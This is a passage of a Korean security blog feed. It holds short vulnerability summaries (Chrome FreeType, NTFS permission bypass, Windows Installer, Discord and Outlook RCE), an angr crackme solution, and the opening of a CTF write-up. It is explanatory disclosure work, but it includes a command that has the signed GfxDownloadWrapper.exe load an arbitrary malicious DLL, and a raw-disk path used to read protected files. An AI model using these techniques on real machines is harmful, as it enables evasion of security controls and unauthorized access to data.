src="/2020/10/25/idioth/angryghidra/img10.png" alt></p><p>Window - AngryGhidraPlugin&#xC744; &#xD074;&#xB9AD;&#xD558;&#xBA74; &#xC704;&#xC758; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC740; &#xCC3D;&#xC774; &#xB739;&#xB2C8;&#xB2E4;. &#xC778;&#xC790;&#xC758; &#xAE38;&#xC774;&#xB97C; &#xC9C0;&#xC815;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xACE0;, auto_load_libs&#xB97C; &#xC124;&#xC815;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Blank State&#xC640; Find address, avoid address&#xB97C; &#xBAA8;&#xB450; &#xC124;&#xC815;&#xD558;&#xC600;&#xC73C;&#xB2C8; Run &#xBC84;&#xD2BC;&#xC744; &#xB20C;&#xB7EC; angr&#xB97C; &#xB3CC;&#xB824;&#xBD05;&#xC2DC;&#xB2E4;.</p><p>&#xC7A0;&#xC2DC; &#xAE30;&#xB2E4;&#xB824;&#xBCF4;&#xBA74; Solution Found&#xB77C;&#xACE0; &#xB728;&#xBA70; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC5B4;&#xB5A4; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xB739;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/25/idioth/angryghidra/img11.png" alt></p><p>&#xB098;&#xC628; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC785;&#xB825;&#xD574;&#xBCF4;&#xBA74;</p><pre><code class="hljs bash">~/Desktop$ ./r100.bin Enter the password: Code_TalkersNice!</code></pre><p>&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xCC3E;&#xC740; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB098;&#xB294; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC; &#xBCF4;&#xACE0; &#xD074;&#xB9AD;&#xC9C8;&#xB9CC; &#xBA87; &#xBC88; &#xD558;&#xBA74; &#xAC12;&#xC744; &#xCC3E;&#xC544;&#xC900;&#xB2E4;? &#xC815;&#xB9D0; &#xC778;&#xAC04;&#xC758; &#xC695;&#xAD6C;&#xC5D0; &#xCDA9;&#xC2E4;&#xD55C; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC774; &#xC544;&#xB2D0; &#xC218;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC9C1;&#xC811; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD574;&#xC11C; &#xB3CC;&#xB9AC;&#xB294; &#xAC83;&#xC774; &#xAE30;&#xB2A5;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xD6E8;&#xC52C; &#xD6A8;&#xC728;&#xC801;&#xC77C; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xBC14;&#xB85C;&#xBC14;&#xB85C; angr &#xD658;&#xACBD; &#xC138;&#xD305; &#xBC0F; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC774; &#xB9E4;&#xB825;&#xC801;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xC9C1;&#xC740; &#xAC04;&#xB2E8;&#xD55C; &#xAC83;&#xB4E4;&#xB85C;&#xB9CC; &#xD574;&#xBCF4;&#xACE0; &#xB354; &#xBCF5;&#xC7A1;&#xD55C; &#xAC83;&#xB4E4;&#xC740; &#xC0AC;&#xC6A9;&#xD574;&#xBCF4;&#xC9C0; &#xC54A;&#xC558;&#xB294;&#xB370; &#xB098;&#xC911;&#xC5D0; &#xAE30;&#xD68C;&#xAC00; &#xB41C;&#xB2E4;&#xBA74; &#xB354; &#xBCF5;&#xC7A1;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC0AC;&#xC6A9;&#xD574;&#xBCF4;&#xACE0; &#xC62C;&#xB824;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;</p><p>&#xC624;&#xB298;&#xB3C4; &#xC800;&#xC758; &#xBA4D;&#xCCAD;&#xD568;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xADF9;&#xBCF5;&#xD55C; &#xB098;&#xC5D0;&#xAC8C; &#xAC74;&#xBC30;&#xD558;&#xBA70;.. adios..</p><p align="center"><img src="./img12.jpg" width="50%" heightd="50%"></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>angr</tag>
      
      <tag>ghidra</tag>
      
      <tag>angryghidra</tag>
      
      <tag>symbolic execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15999: Chrome 0-day, Heap buffer overflow</title>
    <link href="/2020/10/24/fabu1ous/2020-10-24/"/>
    <url>/2020/10/24/fabu1ous/2020-10-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://savannah.nongnu.org/bugs/?59308">Heap buffer overflow due to integer truncation in Load_SBit_Png</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Google Chrome</p><p>Freetype</p><p>libpng</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2020-10-21&#xC77C; Chrome &#xAE34;&#xAE09; &#xD328;&#xCE58;&#xAC00; &#xB9B4;&#xB9AC;&#xC988; &#xB410;&#xC2B5;&#xB2C8;&#xB2E4;. CVE-2020-15999&#xB294; Chrome&#xC5D0;&#xC11C; &#xD3F0;&#xD2B8;&#xB97C; &#xB80C;&#xB354;&#xB9C1; &#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; Freetype&#xC640; &#xACF5;&#xC2DD; PNG &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; libpng &#xC0AC;&#xC774;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC774;&#xC288;&#xC785;&#xB2C8;&#xB2E4;. &#xAC01; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB294; &#xC774;&#xBBF8;&#xC9C0;&#xB85C;&#xBD80;&#xD130; 32-bit integer&#xD06C;&#xAE30;&#xC758; width&#xC640; height&#xAC12;&#xC744; &#xCC38;&#xC870;&#xD574; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xB370;, Freetype&#xC740; 16-bit&#xB85C; truncate(&#xCD95;&#xC18C;)&#xD55C; &#xB4A4; bitmap &#xD560;&#xB2F9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; size&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xBBF8;&#xC9C0;&#xC758; width&#xC640; height&#xAC00; 16-bit &#xBCF4;&#xB2E4; &#xD06C;&#xB2E4;&#xBA74; Freetype&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; bitmap&#xC774; &#xC2E4;&#xC81C; &#xC774;&#xBBF8;&#xC9C0;&#xBCF4;&#xB2E4; &#xC791;&#xACA0;&#xC8E0;? &#xC774;  bitmap&#xC744; libpng&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xBA74;&#xC11C; heap buffer overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>heap bof</tag>
      
      <tag>png</tag>
      
      <tag>freetype</tag>
      
      <tag>libpng</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Bypassing NTFS permissions to read any files as unprivileged user</title>
    <link href="/2020/10/23/l0ch/10-23_1day1line/"/>
    <url>/2020/10/23/l0ch/10-23_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/ioncodes/CVE-2020-16938">POC using Windows API calls</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 2004/Server 2004</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xB85C;&#xCEEC; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC758; &#xC804;&#xCCB4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC5F4;&#xB78C;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC758; POC&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCD5C;&#xADFC; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB85C; &#xD30C;&#xD2F0;&#xC158;, &#xBCFC;&#xB968; &#xC7A5;&#xCE58;&#xC5D0; &#xB300;&#xD55C; &#xAD8C;&#xD55C;&#xC774; &#xBCC0;&#xACBD;&#xB418;&#xC5B4; <code>\\.\PhysicalDrive0\</code>&#xACBD;&#xB85C;&#xB85C; &#xC7A5;&#xCE58;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xAD8C;&#xD55C;&#xC744; &#xC6B0;&#xD68C;&#xD574; arbitrary file read&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="/2020/10/23/l0ch/10-23_1day1line/image1.png" alt="image1"></p><p>NTFS parser&#xC778; 7zip&#xC73C;&#xB85C;&#xB3C4; arbitrary file read &#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://twitter.com/jonasLyk/status/1316104870987010048">https://twitter.com/jonasLyk/status/1316104870987010048</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>ntfs</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] GfxDownloadWrapper.exe LOLBIN을 이용한 Assembly Loading</title>
    <link href="/2020/10/22/idioth/gfxdownloadwrapper/"/>
    <url>/2020/10/22/idioth/gfxdownloadwrapper/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bohops.com/2020/10/21/exploring-an-assembly-loading-technique-and-detection-mechanism-for-the-gfxdownloadwrapper-exe-lolbin/">Exploring an Assembly Loading Technique and Detection Mechanism for the GfxDownloadWrapper.exe LOLBIN</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>GfxDownloadWrapper.exe&#xB294; &#xC778;&#xD154; &#xBE44;&#xB514;&#xC624; &#xCE74;&#xB4DC; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB85C; &#xC778;&#xD154; &#xADF8;&#xB798;&#xD53D; &#xCEE8;&#xD2B8;&#xB864; &#xD328;&#xB110; &#xBC0F; &#xAC8C;&#xC784; &#xADF8;&#xB798;&#xD53D; &#xC124;&#xC815;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; .NET &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC740; &#x201C;Microsoft Windows Third Party Component CA 2012&#x201D;&#xB85C; &#xC778;&#xC99D;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. GfxDownloadWrapper.exe&#xB294; &#xC784;&#xC758; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xB8E8;&#xD2F4;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0;&#xB9CC; &#xB0AE;&#xC740; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xADF8;&#xB7EC;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>main()</code> &#xC9C4;&#xC785;&#xC810;&#xC5D0;&#xC11C; &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xBC1C;&#xACAC;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC778;&#xC790;&#xB97C; &#xC870;&#xC791;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>args[0]: &#x201C;run&#x201D;&#xC758; &#xBB38;&#xC790;&#xC5F4; &#xAC12;</li><li>args[1]: &#xC5B4;&#xC148;&#xBE14;&#xB9AC; DLL &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xACBD;&#xB85C;</li><li>args[2]: &#xD544;&#xC218; &#xC5B4;&#xC148;&#xBE14;&#xB9AC; method &#xC22B;&#xC790; &#xBB38;&#xC790;&#xC5F4; &#xAC12;<ul><li>0: <code>ApplyRecommendedSettings</code>, 1: <code>RestoreRecommendedSettings</code>, 2: <code>CacheCleanup</code></li></ul></li><li>args[3]: <code>AppData</code> &#xC0C1;&#xB300; &#xACBD;&#xB85C;&#xC5D0; &#xC788;&#xB294; &#xAC8C;&#xC784; &#xC2DD;&#xBCC4;&#xC790; &#xAC12;</li></ul><pre><code class="hljs powershell">GfxDownloadWrapper.exe <span class="hljs-string">&quot;run&quot;</span> <span class="hljs-string">&quot;payload.dll&quot;</span> <span class="hljs-string">&quot;MethodNumber&quot;</span> <span class="hljs-string">&quot;;AppData\\Local\\Intel\\Games\\&#xC784;&#xC758; &#xAC12;&quot;</span></code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xC778;&#xC790;&#xB97C; &#xB9DE;&#xCDB0;&#xC900; &#xD6C4; DLL &#xACBD;&#xB85C;&#xB97C; &#xC545;&#xC131; dll&#xB85C; &#xC9C0;&#xC815;&#xD558;&#xBA74; &#xC545;&#xC131; &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD55C; &#xD6C4; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>living of the land</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16902: Windows Installer EoP</title>
    <link href="/2020/10/21/fabu1ous/2020-10-21/"/>
    <url>/2020/10/21/fabu1ous/2020-10-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-windows-installer-elevation-of-privileges-vulnerability/">SSD Advisory &#x2013; Windows Installer Elevation of Privileges Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows Installer</p><p><strong>Affected Versions</strong></p><ul><li>Windows 7</li><li>Windows 8</li><li>Windows 10</li><li>Windows 2008</li><li>Windows 2012</li><li>Windows 2016</li><li>Windows 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SSD Secure Disclosure program&#xC5D0; &#xC81C;&#xBCF4;&#xB41C; CVE-2020-16902&#xC785;&#xB2C8;&#xB2E4;. Windows Installer&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC758; &#xC124;&#xCE58;, &#xAD00;&#xB9AC;, &#xC81C;&#xAC70;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; Windows &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;. <code>SetSecurity()</code>&#xC758; race condition &#xBB38;&#xC81C;&#xB85C; &#xC778;&#xD574; Windows installer&#xB294; &#xD328;&#xCE58;&#xC640; &#xD328;&#xCE58; &#xC6B0;&#xD68C;&#xAC00; &#xBC18;&#xBCF5;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC9C0;&#xAE08; &#xC18C;&#xAC1C;&#xD558;&#xB294; CVE-2020-16902&#xB3C4; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Windows Installer&#xB294; &#xC124;&#xCE58; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xB450; &#xAC00;&#xC9C0; &#xC791;&#xC5C5;&#xC744; &#xCD94;&#xAC00;&#xB85C; &#xBCD1;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC124;&#xCE58; &#xC791;&#xC5C5;&#xC758; &#xC2E4;&#xD328;&#xB97C; &#xB300;&#xBE44;&#xD574; roll back script (<code>.RBS</code>)&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0;, &#xC124;&#xCE58; &#xC791;&#xC5C5; &#xC911; &#xC0AD;&#xC81C;&#xB418;&#xB294; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xBCF5;&#xC81C;&#xD574; c:\Config.Msi&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. <code>.RBS</code>&#xB97C; &#xC791;&#xC131;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xD2B9;&#xC815; &#xB8E8;&#xD2F4;&#xC744; &#xAC70;&#xCE58;&#xB294;&#xB370;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> Config.Msi &#xC18D; &#xC784;&#xC2DC;&#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xC0DD;&#xC131;<span class="hljs-number">2.</span> Config.Msi &#xC0AD;&#xC81C;<span class="hljs-number">3.</span> Config.Msi &#xC874;&#xC7AC; &#xC5EC;&#xBD80; &#xD655;&#xC778;<span class="hljs-number">4.</span> Config.Msi &#xC0DD;&#xC131;</code></pre><p>3&#xBC88; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Config.Msi &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xAC00; &#xC5EC;&#xC804;&#xD788; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74; <code>SetSecurity()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA70; &#xAE30;&#xC874; &#xCDE8;&#xC57D;&#xC810;(CVE-2020-1302)&#xC774; &#xADF8;&#xB300;&#xB85C; &#xB2E4;&#xC2DC; &#xC545;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>eop</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>local</tag>
      
      <tag>system privilege</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Discord Desktop app RCE</title>
    <link href="/2020/10/20/l0ch/Discord_RCE/"/>
    <url>/2020/10/20/l0ch/Discord_RCE/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mksben.l0.cm/2020/10/discord-desktop-rce.html">Discord Desktop app RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Discord Desktop app</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>node.js &#xAE30;&#xBC18; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC778; Electron&#xC73C;&#xB85C; &#xAC1C;&#xBC1C;&#xB41C; Discord&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>Electron&#xC758; <code>BrowserWindow API</code> &#xC635;&#xC158; &#xC911; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xBD84;&#xB9AC;&#xD558;&#xB294; <code>contextIsolation</code> &#xC635;&#xC158;&#xC774; discord&#xC5D0;&#xC11C;&#xB294; &#xBE44;&#xD65C;&#xC131;&#xD654; &#xB3FC;&#xC788;&#xC5B4; injection&#xB41C; JS&#xAC00; &#xB0B4;&#xBD80; &#xD398;&#xC774;&#xC9C0; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC904; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; iframe embed XSS &#xB97C; &#xD1B5;&#xD574; JavaScript &#xB0B4;&#xC7A5; &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xC7AC;&#xC815;&#xC758;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC774;&#xB54C; Navigation restriction&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xBA74; iframe&#xC744; escape&#xD574; &#xCD5C;&#xC0C1;&#xC704; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>xss</tag>
      
      <tag>rce</tag>
      
      <tag>javascript</tag>
      
      <tag>L0ch</tag>
      
      <tag>electron</tag>
      
      <tag>context isolation</tag>
      
      <tag>discord</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16947: Outlook 365 Remote Command Execution</title>
    <link href="/2020/10/19/idioth/cve-2020-16947/"/>
    <url>/2020/10/19/idioth/cve-2020-16947/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0neb1n/CVE-2020-16947">CVE-2020-16947</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Outlook 365 apps for Enterprise/2016/2019</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlook 365&#xC5D0;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC; &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xCC98;&#xB9AC;&#xB97C; &#xC798;&#xBABB;&#xD558;&#xC5EC; RCE&#xAC00; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>HTML &#xCF58;&#xD150;&#xCE20;&#xC5D0;&#xC11C; ASCII &#xBC94;&#xC704; &#xBC16;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBCF5;&#xC0AC;&#xD560; &#xB54C; &#xD574;&#xB2F9; &#xBB38;&#xC790;&#xC5F4;&#xB4E4;&#xC740; <code>0xfffd</code>&#xB85C; &#xAD50;&#xCCB4;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xBCF5;&#xC0AC;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xD06C;&#xAE30;&#xAC00; 2&#xBC30;&#xAC00; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; src &#xBC84;&#xD37C;&#xC640; dst &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xAC19;&#xC544;&#xB3C4; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD604;&#xC7AC; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xC790;&#xC138;&#xD55C; &#xAE30;&#xC220;&#xC801; &#xC124;&#xBA85;&#xACFC; exploit&#xC740; &#xACF5;&#xAC1C;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>outlook</tag>
      
      <tag>idioth</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>memory corruption</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF eat-the-pie</title>
    <link href="/2020/10/18/fabu1ous/sstf-eat-the-pie/"/>
    <url>/2020/10/18/fabu1ous/sstf-eat-the-pie/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p>&#xB274;&#xBE44;&#xBD80;&#xD130; &#xACE0;&#xC218;&#xAE4C;&#xC9C0; &#xBAA8;&#xB450; &#xC990;&#xAE38; &#xC218; &#xC788;&#xB294; CTF&#xB77C;&#xB294; &#xC18C;&#xAC1C;&#xAE00;&#xC744; &#xBCF4;&#xACE0; &#xB300;&#xD559; &#xB3D9;&#xC544;&#xB9AC; &#xC2E0;&#xC785;&#xC0DD;&#xB4E4;&#xC744; &#xB370;&#xB9AC;&#xACE0; SSTF&#xC5D0; &#xCD9C;&#xC804;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xC88B;&#xC740; &#xC131;&#xC801;&#xC744; &#xB0B4;&#xC9C4; &#xBABB;&#xD588;&#xB124;&#xC694;. &#xC0AC;&#xC2E4; &#xC774; write-up&#xC740; &#xAC19;&#xC774; &#xCD9C;&#xC804;&#xD55C; &#xC2E0;&#xC785;&#xC0DD; &#xCE5C;&#xAD6C;&#xB4E4;&#xC5D0;&#xAC8C; &#xBCF4;&#xC5EC;&#xC8FC;&#xB824;&#xACE0; &#xC791;&#xC131;&#xD588;&#xB294;&#xB370; &#xBA87; &#xBA85;&#xC774;&#xB098; &#xC77D;&#xC5C8;&#xC744;&#xC9C0;&#x2026;</p><p>CTF&#xB97C; &#xCC98;&#xC74C; &#xACBD;&#xD5D8;&#xD558;&#xB294; &#xCE5C;&#xAD6C;&#xB4E4;&#xC774;&#xB77C; &#xCD5C;&#xB300;&#xD55C; &#xD480;&#xC5B4;&#xC11C; &#xC124;&#xBA85;&#xC744; &#xC801;&#xC5C8;&#xC73C;&#xBA70;, CTF&#xC5D0; &#xB300;&#xD55C; &#xC800;&#xC758; &#xACAC;&#xD574;&#xB3C4; &#xC870;&#xAE08;&#xC529; &#xC11E;&#xC5EC; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. eat-the-pie&#xB97C; &#xD480; &#xB2F9;&#xC2DC; &#xC800;&#xC758; &#xC0AC;&#xACE0; &#xD750;&#xB984;&#xC744; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xC791;&#xC131;&#xD588;&#xACE0; &#xC774; &#xAE00;&#xC744; &#xC77D;&#xC73C;&#xC2E4; &#xB54C;&#xB3C4; 